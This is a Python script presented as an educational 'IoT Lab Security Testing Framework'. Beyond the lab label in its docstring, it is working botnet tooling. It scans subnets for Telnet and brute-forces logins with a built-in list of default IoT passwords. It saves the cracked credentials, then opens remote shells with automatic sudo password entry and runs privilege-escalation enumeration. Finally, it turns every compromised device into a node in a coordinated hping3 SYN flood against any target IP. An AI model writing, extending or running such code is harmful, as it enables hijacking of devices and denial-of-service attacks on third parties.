#!/usr/bin/env python3
"""
IoT Lab Security Testing Framework
Educational tool for testing IoT devices in isolated lab environments
"""

import socket
import telnetlib
import threading
import time
import json
import sqlite3
from datetime import datetime
import ipaddress
import argparse
from concurrent.futures import ThreadPoolExecutor

class IoTLabTester:
    def __init__(self, db_file="iot_lab_results.db", speed_mode="normal"):
        self.db_file = db_file
        self.speed_mode = speed_mode
        self.init_database()
        self.vulnerable_devices = []
        
        # Speed configuration
        self.speed_configs = {
            "slow": {
                "scan_threads": 10,
                "scan_timeout": 5,
                "login_timeout": 15,
                "delay_between_attempts": 2.0,
                "description": "Slow and stealthy (10 threads, 2s delay)"
            },
            "normal": {
                "scan_threads": 50,
                "scan_timeout": 3,
                "login_timeout": 10,
                "delay_between_attempts": 0.5,
                "description": "Balanced speed (50 threads, 0.5s delay)"
            },
            "fast": {
                "scan_threads": 100,
                "scan_timeout": 2,
                "login_timeout": 8,
                "delay_between_attempts": 0.1,
                "description": "Fast scanning (100 threads, 0.1s delay)"
            },
            "turbo": {
                "scan_threads": 200,
                "scan_timeout": 1,
                "login_timeout": 5,
                "delay_between_attempts": 0,
                "description": "Maximum speed (200 threads, no delay) - Use with caution!"
            }
        }
        
        self.config = self.speed_configs.get(speed_mode, self.speed_configs["normal"])
        print(f"[INFO] Speed mode: {speed_mode.upper()} - {self.config['description']}")
        
    def init_database(self):
        """Initialize SQLite database for storing results"""
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS vulnerable_devices (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip_address TEXT,
                username TEXT,
                password TEXT,
                device_banner TEXT,
                timestamp TEXT
            )
        ''')
        conn.commit()
        conn.close()
        
    def scan_telnet_port(self, ip, timeout=None):
        """Scan a single IP for open Telnet port (23)"""
        if timeout is None:
            timeout = self.config['scan_timeout']
            
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((ip, 23))
            sock.close()
            return result == 0
        except:
            return False
            
    def scan_subnet(self, subnet):
        """Scan subnet for open Telnet ports"""
        print(f"[INFO] Scanning subnet {subnet} for open Telnet ports...")
        open_hosts = []
        
        try:
            network = ipaddress.IPv4Network(subnet, strict=False)
            
            with ThreadPoolExecutor(max_workers=self.config['scan_threads']) as executor:
                futures = {executor.submit(self.scan_telnet_port, str(ip)): str(ip) 
                          for ip in network.hosts()}
                
                for future in futures:
                    ip = futures[future]
                    try:
                        if future.result():
                            open_hosts.append(ip)
                            print(f"[+] Found open Telnet on {ip}")
                    except Exception as e:
                        continue
                        
        except Exception as e:
            print(f"[ERROR] Error scanning subnet: {e}")
            
        print(f"[INFO] Found {len(open_hosts)} hosts with open Telnet ports")
        return open_hosts
        
    def load_credentials(self, creds_file):
        """Load credentials from file"""
        credentials = []
        default_creds = [
            "admin:admin", "admin:password", "admin:12345", "admin:",
            "root:root", "root:admin", "root:password", "root:12345",
            "user:user", "guest:guest", "test:test", "admin:admin123",
            "administrator:administrator", "admin:1234", "root:toor",
            "support:support", "service:service", "operator:operator",
            "ipcamadmin:admin", "temphumidadmin:admin"
        ]
        
        try:
            with open(creds_file, 'r') as f:
                for line in f:
                    line = line.strip()
                    if ':' in line:
                        credentials.append(line.split(':', 1))
        except FileNotFoundError:
            print(f"[INFO] Credentials file not found, using default credentials")
            
        # Add default credentials if file wasn't loaded
        if not credentials:
            for cred in default_creds:
                if ':' in cred:
                    credentials.append(cred.split(':', 1))
                    
        print(f"[INFO] Loaded {len(credentials)} credential pairs")
        return credentials
        
    def test_telnet_login(self, ip, username, password, timeout=None):
        """Test Telnet login with given credentials"""
        if timeout is None:
            timeout = self.config['login_timeout']
            
        try:
            tn = telnetlib.Telnet(ip, 23, timeout=timeout)
            
            # Read initial banner
            banner = tn.read_until(b"login:", timeout=5).decode('ascii', errors='ignore')
            
            # Send username
            tn.write(username.encode('ascii') + b"\n")
            tn.read_until(b"Password:", timeout=5)
            
            # Send password
            tn.write(password.encode('ascii') + b"\n")
            
            # Check for successful login
            response = tn.read_until(b"#", timeout=5).decode('ascii', errors='ignore')
            tn.close()
            
            if "#" in response or "$" in response:
                return True, banner.strip()
            else:
                return False, None
                
        except Exception as e:
            return False, None
            
    def brute_force_credentials(self, hosts, credentials):
        """Brute force credentials on discovered hosts"""
        print(f"[INFO] Testing credentials on {len(hosts)} hosts...")
        
        for host in hosts:
            print(f"[INFO] Testing {host}...")
            
            for username, password in credentials:
                success, banner = self.test_telnet_login(host, username, password)
                
                if success:
                    print(f"[+] SUCCESS: {host} - {username}:{password}")
                    print(f"[+] CREDENTIALS: {username}:{password}")
                    
                    # Store in database
                    self.store_vulnerable_device(host, username, password, banner)
                    break
                else:
                    # Always show failed attempts to see brute-forcing speed
                    print(f"[-] Failed: {host} - {username}:{password}")
                    
                # Apply speed-based delay
                if self.config['delay_between_attempts'] > 0:
                    time.sleep(self.config['delay_between_attempts'])
                
    def store_vulnerable_device(self, ip, username, password, banner):
        """Store vulnerable device in database"""
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO vulnerable_devices 
            (ip_address, username, password, device_banner, timestamp)
            VALUES (?, ?, ?, ?, ?)
        ''', (ip, username, password, banner, datetime.now().isoformat()))
        
        conn.commit()
        conn.close()
        
        self.vulnerable_devices.append({
            'ip': ip,
            'username': username,
            'password': password,
            'banner': banner
        })
        
    def print_credentials_only(self):
        """Print only the credentials in clean format"""
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        
        cursor.execute('SELECT ip_address, username, password FROM vulnerable_devices')
        devices = cursor.fetchall()
        conn.close()
        
        if not devices:
            print("[INFO] No credentials found")
            return
            
        print("\n[+] DISCOVERED CREDENTIALS:")
        print("=" * 50)
        for device in devices:
            print(f"{device[0]} -> {device[1]}:{device[2]}")
        print("=" * 50)
        
    def list_vulnerable_devices(self):
        """List all vulnerable devices from database"""
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        
        cursor.execute('SELECT * FROM vulnerable_devices')
        devices = cursor.fetchall()
        conn.close()
        
        if not devices:
            print("[INFO] No vulnerable devices found")
            return []
            
        print("\n[INFO] Vulnerable Devices:")
        print("-" * 80)
        for device in devices:
            print(f"IP: {device[1]}")
            print(f"Credentials: {device[2]}:{device[3]}")
            print(f"Banner: {device[4][:50]}...")
            print(f"Discovered: {device[5]}")
            print("-" * 80)
            
        return devices
        
    def interactive_session(self, ip, username, password):
        """Open interactive Telnet session with advanced attack options"""
        print(f"[INFO] Opening session to {ip} with {username}:{password}")
        print("[INFO] Available attack commands:")
        print("  1. whoami - Check current user")
        print("  2. uname -a - System information")
        print("  3. ps aux - Running processes")
        print("  4. netstat -an - Network connections")
        print("  5. cat /etc/passwd - User accounts")
        print("  6. sudo hping3 - Launch DoS attack (with auto-password)")
        print("  7. shell - Drop to interactive shell")
        print("  8. recon - Run reconnaissance commands")
        print("  9. exploit - Run exploitation commands")
        print("  10. exit - Close session")
        print("[INFO] Type 'help' for command details")
        
        try:
            tn = telnetlib.Telnet(ip, 23, timeout=10)
            
            # Login
            tn.read_until(b"login:")
            tn.write(username.encode('ascii') + b"\n")
            tn.read_until(b"Password:")
            tn.write(password.encode('ascii') + b"\n")
            
            # Wait for prompt (# or $)
            response = tn.read_until(b"#", timeout=10)
            if b"#" not in response:
                tn.read_until(b"$", timeout=5)
            
            while True:
                command = input(f"{ip}# ").strip()
                
                if command.lower() == 'exit':
                    break
                elif command.lower() == 'help':
                    self._show_help()
                    continue
                elif command.lower() == 'shell':
                    print("[INFO] Dropping to interactive shell. Type 'exit_shell' to return to menu.")
                    self._interactive_shell(tn, ip, password)
                    continue
                elif command.lower() == 'recon':
                    self._run_recon_commands(tn, ip, password)
                    continue
                elif command.lower() == 'exploit':
                    self._run_exploit_commands(tn, ip, password)
                    continue
                elif command.startswith('sudo hping3'):
                    self._run_hping3_attack(tn, ip, password, command)
                    continue
                elif command == '6':
                    target = input("Enter target IP for hping3 attack: ").strip()
                    if target:
                        hping_cmd = f"sudo hping3 -S --flood --rand-source -V {target}"
                        self._run_hping3_attack(tn, ip, password, hping_cmd)
                    continue
                    
                # Handle numbered commands
                if command.isdigit():
                    command = self._get_numbered_command(command)
                    if not command:
                        continue
                
                if command:
                    tn.write(command.encode('ascii') + b"\n")
                    response = tn.read_until(b"#", timeout=10)
                    if b"#" not in response:
                        response += tn.read_until(b"$", timeout=5)
                    print(response.decode('ascii', errors='ignore'))
                    
            tn.close()
            
        except Exception as e:
            print(f"[ERROR] Session error: {e}")
    
    def _show_help(self):
        """Show detailed help for commands"""
        print("\n[HELP] Detailed Command Information:")
        print("="*60)
        print("1. whoami          - Display current username")
        print("2. uname -a        - Show system kernel and architecture")
        print("3. ps aux          - List all running processes")
        print("4. netstat -an     - Show network connections and ports")
        print("5. cat /etc/passwd - Display user accounts")
        print("6. sudo hping3     - Launch DoS flood attack (auto-password)")
        print("7. shell           - Interactive shell mode")
        print("8. recon           - Automated reconnaissance")
        print("9. exploit         - Automated exploitation attempts")
        print("10. exit           - Close telnet session")
        print("\nSpecial Commands:")
        print("- help             - Show this help menu")
        print("- Custom commands  - Type any Linux command directly")
        print("="*60)
    
    def _get_numbered_command(self, number):
        """Convert numbered choice to actual command"""
        commands = {
            '1': 'whoami',
            '2': 'uname -a',
            '3': 'ps aux',
            '4': 'netstat -an',
            '5': 'cat /etc/passwd'
        }
        return commands.get(number)
    
    def _interactive_shell(self, tn, ip, password):
        """Interactive shell mode"""
        print(f"[SHELL] Interactive shell on {ip}")
        print("[SHELL] Type 'exit_shell' to return to menu")
        
        while True:
            try:
                command = input(f"shell@{ip}:~$ ").strip()
                
                if command.lower() == 'exit_shell':
                    print("[INFO] Returning to command menu...")
                    break
                
                if command.startswith('sudo') and command != 'sudo -l':
                    # Auto-handle sudo password
                    tn.write(command.encode('ascii') + b"\n")
                    response = tn.read_until(b"password", timeout=3)
                    if b"password" in response.lower():
                        print(f"[AUTO] Entering password for sudo command...")
                        tn.write(password.encode('ascii') + b"\n")
                        response = tn.read_until(b"#", timeout=15)
                        if b"#" not in response:
                            response += tn.read_until(b"$", timeout=5)
                    print(response.decode('ascii', errors='ignore'))
                else:
                    tn.write(command.encode('ascii') + b"\n")
                    response = tn.read_until(b"#", timeout=10)
                    if b"#" not in response:
                        response += tn.read_until(b"$", timeout=5)
                    print(response.decode('ascii', errors='ignore'))
                    
            except KeyboardInterrupt:
                print("\n[INFO] Use 'exit_shell' to return to menu")
                continue
            except Exception as e:
                print(f"[ERROR] Shell error: {e}")
                break
    
    def _run_hping3_attack(self, tn, ip, password, command):
        """Run hping3 attack with automatic password handling"""
        print(f"[ATTACK] Launching hping3: {command}")
        print("[WARNING] This will start a DDoS attack! Press Ctrl+C to stop.")
        print("[INFO] Auto-entering password if requested...")
        
        try:
            tn.write(command.encode('ascii') + b"\n")
            
            # Check for password prompt
            response = tn.read_until(b"password", timeout=3)
            if b"password" in response.lower():
                print("[AUTO] Sudo password requested, entering password...")
                tn.write(password.encode('ascii') + b"\n")
            
            print("[ATTACK] hping3 attack started. Monitor network traffic...")
            print("[CTRL+C] Press Ctrl+C to stop the attack")
            
            # Monitor attack output
            attack_running = True
            while attack_running:
                try:
                    response = tn.read_very_eager()
                    if response:
                        output = response.decode('ascii', errors='ignore')
                        print(output, end='')
                    time.sleep(0.1)
                except KeyboardInterrupt:
                    print("\n[STOP] Stopping hping3 attack...")
                    tn.write(b"\x03")  # Send Ctrl+C
                    time.sleep(1)
                    tn.write(b"\n")
                    attack_running = False
                    break
                    
        except Exception as e:
            print(f"[ERROR] hping3 attack error: {e}")
    
    def _run_recon_commands(self, tn, ip, password):
        """Run automated reconnaissance commands"""
        print(f"[RECON] Running reconnaissance on {ip}...")
        
        recon_commands = [
            ("System Info", "uname -a"),
            ("Current User", "whoami"),
            ("User ID", "id"),
            ("Network Config", "ifconfig -a"),
            ("Route Table", "route -n"),
            ("DNS Config", "cat /etc/resolv.conf"),
            ("Network Connections", "netstat -tuln"),
            ("Running Services", "ps aux | grep -E '(ssh|telnet|ftp|http|mysql)'"),
            ("Crontab", "crontab -l"),
            ("Home Directory", "ls -la ~"),
            ("Writable Directories", "find / -writable -type d 2>/dev/null | head -10")
        ]
        
        for desc, cmd in recon_commands:
            print(f"\n[RECON] {desc}: {cmd}")
            tn.write(cmd.encode('ascii') + b"\n")
            response = tn.read_until(b"#", timeout=10)
            if b"#" not in response:
                response += tn.read_until(b"$", timeout=5)
            print(response.decode('ascii', errors='ignore'))
            time.sleep(0.5)
    
    def _run_exploit_commands(self, tn, ip, password):
        """Run automated exploitation commands"""
        print(f"[EXPLOIT] Running exploitation attempts on {ip}...")
        
        exploit_commands = [
            ("Check sudo rights", "sudo -l"),
            ("Check SUID binaries", "find / -perm -4000 -type f 2>/dev/null"),
            ("Check capabilities", "getcap -r / 2>/dev/null"),
            ("Kernel version", "uname -r"),
            ("OS version", "cat /etc/os-release"),
            ("Check for Docker", "docker ps 2>/dev/null"),
            ("Environment variables", "env | grep -E '(PATH|HOME|USER|PWD)'"),
            ("Check /etc/passwd permissions", "ls -la /etc/passwd"),
            ("Check /etc/shadow permissions", "ls -la /etc/shadow"),
            ("Check for SSH keys", "find /home -name '*.ssh' -type d 2>/dev/null")
        ]
        
        for desc, cmd in exploit_commands:
            print(f"\n[EXPLOIT] {desc}: {cmd}")
            
            if cmd.startswith('sudo'):
                tn.write(cmd.encode('ascii') + b"\n")
                response = tn.read_until(b"password", timeout=3)
                if b"password" in response.lower():
                    print(f"[AUTO] Entering password for: {cmd}")
                    tn.write(password.encode('ascii') + b"\n")
                    response = tn.read_until(b"#", timeout=10)
                    if b"#" not in response:
                        response += tn.read_until(b"$", timeout=5)
            else:
                tn.write(cmd.encode('ascii') + b"\n")
                response = tn.read_until(b"#", timeout=10)
                if b"#" not in response:
                    response += tn.read_until(b"$", timeout=5)
                
            print(response.decode('ascii', errors='ignore'))
            time.sleep(0.5)
    
    def ddos_attack(self, target_ip):
        """Launch coordinated DDoS attack from all compromised devices"""
        devices = self.list_vulnerable_devices()
        
        if not devices:
            print("[ERROR] No compromised devices found. Run brute-force attack first.")
            return
            
        print(f"\n[DDOS] Preparing DDoS attack against {target_ip}")
        print(f"[DDOS] Using {len(devices)} compromised devices as attack nodes")
        print("[WARNING] This will launch a coordinated DDoS attack!")
        
        # Confirm attack
        confirm = input("Type 'ATTACK' to confirm DDoS: ").strip()
        if confirm != 'ATTACK':
            print("[INFO] Attack cancelled")
            return
            
        # Launch attacks in parallel threads
        attack_threads = []
        
        for device in devices:
            thread = threading.Thread(
                target=self._single_device_ddos,
                args=(device[1], device[2], device[3], target_ip)
            )
            attack_threads.append(thread)
            thread.start()
            
        print(f"\n[DDOS] Distributed attack launched from {len(devices)} devices!")
        print("[DDOS] All devices are now attacking target...")
        print("[CTRL+C] Press Ctrl+C to stop all attacks")
        
        try:
            # Monitor attacks
            while True:
                print(f"[DDOS] Attack in progress from {len(devices)} devices...")
                time.sleep(5)
        except KeyboardInterrupt:
            print("\n[STOP] Stopping all DDoS attacks...")
            self._stop_all_attacks = True
            
            # Wait for threads to finish
            for thread in attack_threads:
                thread.join(timeout=10)
                
            print("[STOP] All attacks stopped")
    
    def _single_device_ddos(self, ip, username, password, target_ip):
        """Run DDoS attack from a single compromised device"""
        self._stop_all_attacks = False
        
        try:
            print(f"[ATTACK] Starting attack from {ip} -> {target_ip}")
            tn = telnetlib.Telnet(ip, 23, timeout=10)
            
            # Login
            tn.read_until(b"login:")
            tn.write(username.encode('ascii') + b"\n")
            tn.read_until(b"Password:")
            tn.write(password.encode('ascii') + b"\n")
            
            # Wait for prompt
            response = tn.read_until(b"#", timeout=10)
            if b"#" not in response:
                tn.read_until(b"$", timeout=5)
            
            # Launch hping3 attack
            hping_cmd = f"sudo hping3 -S --flood --rand-source -V {target_ip}"
            print(f"[{ip}] Executing: {hping_cmd}")
            
            tn.write(hping_cmd.encode('ascii') + b"\n")
            
            # Handle sudo password if requested
            response = tn.read_until(b"password", timeout=3)
            if b"password" in response.lower():
                print(f"[{ip}] Auto-entering sudo password...")
                tn.write(password.encode('ascii') + b"\n")
            
            print(f"[{ip}] DDoS attack active against {target_ip}")
            
            # Keep attack running until stopped
            while not self._stop_all_attacks:
                try:
                    response = tn.read_very_eager()
                    time.sleep(1)
                except:
                    break
                    
            # Stop attack
            print(f"[{ip}] Stopping attack...")
            tn.write(b"\x03")  # Send Ctrl+C
            time.sleep(1)
            tn.close()
            
        except Exception as e:
            print(f"[ERROR] Attack from {ip} failed: {e}")
    
    def coordinated_reconnaissance(self):
        """Run reconnaissance on all compromised devices simultaneously"""
        devices = self.list_vulnerable_devices()
        
        if not devices:
            print("[ERROR] No compromised devices found. Run brute-force attack first.")
            return
            
        print(f"\n[RECON] Running coordinated reconnaissance on {len(devices)} devices")
        
        # Launch recon in parallel threads
        recon_threads = []
        
        for device in devices:
            thread = threading.Thread(
                target=self._single_device_recon,
                args=(device[1], device[2], device[3])
            )
            recon_threads.append(thread)
            thread.start()
            
        # Wait for all recon to complete
        for thread in recon_threads:
            thread.join()
            
        print("\n[RECON] Coordinated reconnaissance completed")
    
    def _single_device_recon(self, ip, username, password):
        """Run reconnaissance on a single device"""
        try:
            print(f"\n[RECON] Starting reconnaissance on {ip}")
            tn = telnetlib.Telnet(ip, 23, timeout=10)
            
            # Login
            tn.read_until(b"login:")
            tn.write(username.encode('ascii') + b"\n")
            tn.read_until(b"Password:")
            tn.write(password.encode('ascii') + b"\n")
            
            # Wait for prompt
            response = tn.read_until(b"#", timeout=10)
            if b"#" not in response:
                tn.read_until(b"$", timeout=5)
            
            # Quick recon commands
            quick_recon = [
                ("System", "uname -a"),
                ("Network", "ifconfig | grep inet"),
                ("Processes", "ps aux | wc -l"),
                ("Users", "who"),
                ("Uptime", "uptime")
            ]
            
            print(f"[{ip}] Device Information:")
            for desc, cmd in quick_recon:
                tn.write(cmd.encode('ascii') + b"\n")
                response = tn.read_until(b"#", timeout=5)
                if b"#" not in response:
                    response += tn.read_until(b"$", timeout=3)
                output = response.decode('ascii', errors='ignore').strip()
                # Extract just the command output
                lines = output.split('\n')
                if len(lines) > 1:
                    result = lines[1].strip() if lines[1].strip() else "No output"
                    print(f"[{ip}] {desc}: {result}")
                
            tn.close()
            print(f"[{ip}] Reconnaissance completed")
            
        except Exception as e:
            print(f"[ERROR] Recon failed on {ip}: {e}")

    # ...existing code...
def main():
    parser = argparse.ArgumentParser(description='IoT Lab Security Testing Framework')
    parser.add_argument('--scan', help='Subnet to scan (e.g., 192.168.1.0/24)')
    parser.add_argument('--creds', help='Credentials file path', default='credentials.txt')
    parser.add_argument('--speed', choices=['slow', 'normal', 'fast', 'turbo'], 
                       default='normal', help='Scanning speed mode')
    parser.add_argument('--creds-only', action='store_true', help='Print only discovered credentials')
    parser.add_argument('--list', action='store_true', help='List vulnerable devices')
    parser.add_argument('--session', help='Open session to IP address')
    
    args = parser.parse_args()
    
    tester = IoTLabTester(speed_mode=args.speed)
    
    if args.scan:
        # Scan and brute force
        hosts = tester.scan_subnet(args.scan)
        if hosts:
            credentials = tester.load_credentials(args.creds)
            tester.brute_force_credentials(hosts, credentials)
            
    elif args.creds_only:
        # Print only credentials
        tester.print_credentials_only()
        
    elif args.list:
        # List vulnerable devices
        tester.list_vulnerable_devices()
        
    elif args.session:
        # Open interactive session        devices = tester.list_vulnerable_devices()
        target_device = None
        
        for device in devices:
            if device[1] == args.session:  # IP match
                target_device = device
                break
                
        if target_device:
            tester.interactive_session(target_device[1], target_device[2], target_device[3])
        else:
            print(f"[ERROR] No credentials found for {args.session}")
            
    else:
        # Interactive mode
        print("=" * 60)
        print("IoT Lab Security Testing Framework")
        print("=" * 60)
        print("Available Operations:")
        print("  1. Scan subnet (port scanning only)")
        print("  2. Brute-force attack (scan + credential testing)")
        print("  3. List vulnerable devices")
        print("  4. Print credentials only") 
        print("  5. Open interactive session")
        print("  6. DDoS attack (all devices)")
        print("  7. Coordinated reconnaissance (all devices)")
        print("=" * 60)
        
        choice = input("Select operation [1-7]: ").strip()
        
        if choice == '1':
            # Simple port scan only
            tester = IoTLabTester(speed_mode='normal')  # Default speed for scanning
            subnet = input("Enter subnet to scan (e.g., 192.168.1.0/24): ").strip()
            if subnet:
                hosts = tester.scan_subnet(subnet)
                print(f"\n[SCAN COMPLETE] Found {len(hosts)} hosts with open Telnet ports")
                
        elif choice == '2':
            # Brute-force attack with speed selection
            print("\n" + "="*50)
            print("BRUTE-FORCE ATTACK CONFIGURATION")
            print("="*50)
            print("Speed Modes Available:")
            print("  1. slow   - Slow and stealthy (10 threads, 2s delay)")
            print("  2. normal - Balanced speed (50 threads, 0.5s delay)")
            print("  3. fast   - Fast scanning (100 threads, 0.1s delay)")
            print("  4. turbo  - Maximum speed (200 threads, no delay)")
            print("="*50)
            
            speed_choice = input("Select speed mode [1-4] or [slow/normal/fast/turbo]: ").strip().lower()
            
            # Map numeric choices to speed names
            speed_map = {'1': 'slow', '2': 'normal', '3': 'fast', '4': 'turbo'}
            if speed_choice in speed_map:
                speed = speed_map[speed_choice]
            elif speed_choice in ['slow', 'normal', 'fast', 'turbo']:
                speed = speed_choice
            else:
                speed = 'normal'
                print(f"[INFO] Invalid selection, using default: normal")
            
            tester = IoTLabTester(speed_mode=speed)
            subnet = input("Enter subnet to attack (e.g., 192.168.1.0/24): ").strip()
            
            if subnet:
                print(f"\n[ATTACK] Starting brute-force attack on {subnet}")
                print(f"[SPEED] Mode: {speed.upper()}")
                hosts = tester.scan_subnet(subnet)
                if hosts:
                    credentials = tester.load_credentials('credentials.txt')
                    tester.brute_force_credentials(hosts, credentials)
                else:
                    print("[INFO] No hosts with open Telnet ports found")
                
        elif choice == '3':
            # List vulnerable devices
            tester = IoTLabTester(speed_mode='normal')
            tester.list_vulnerable_devices()
            
        elif choice == '4':
            # Print credentials only
            tester = IoTLabTester(speed_mode='normal')
            tester.print_credentials_only()
            
        elif choice == '5':
            # Open interactive session
            tester = IoTLabTester(speed_mode='normal')
            devices = tester.list_vulnerable_devices()
            if devices:
                print("\nAvailable targets:")
                for i, device in enumerate(devices, 1):
                    print(f"  {i}. {device[1]} ({device[2]}:{device[3]})")
                
                target_choice = input(f"Select target [1-{len(devices)}] or enter IP: ").strip()
                
                if target_choice.isdigit():
                    idx = int(target_choice) - 1
                    if 0 <= idx < len(devices):
                        device = devices[idx]
                        tester.interactive_session(device[1], device[2], device[3])
                    else:
                        print("[ERROR] Invalid selection")
                else:                    # User entered IP directly
                    ip = target_choice
                    target_device = None
                    for device in devices:
                        if device[1] == ip:
                            target_device = device
                            break
                    
                    if target_device:
                        tester.interactive_session(target_device[1], target_device[2], target_device[3])
                    else:
                        print(f"[ERROR] No credentials found for {ip}")
            else:
                print("[INFO] No vulnerable devices found. Run a brute-force attack first.")
        
        elif choice == '6':
            # DDoS attack
            tester = IoTLabTester(speed_mode='normal')
            target_ip = input("Enter target IP for DDoS attack: ").strip()
            if target_ip:
                tester.ddos_attack(target_ip)
            else:
                print("[ERROR] Target IP is required")
        
        elif choice == '7':
            # Coordinated reconnaissance
            tester = IoTLabTester(speed_mode='normal')
            tester.coordinated_reconnaissance()
        
        else:
            print("[ERROR] Invalid selection. Please choose 1-7.")

if __name__ == "__main__":
    main()
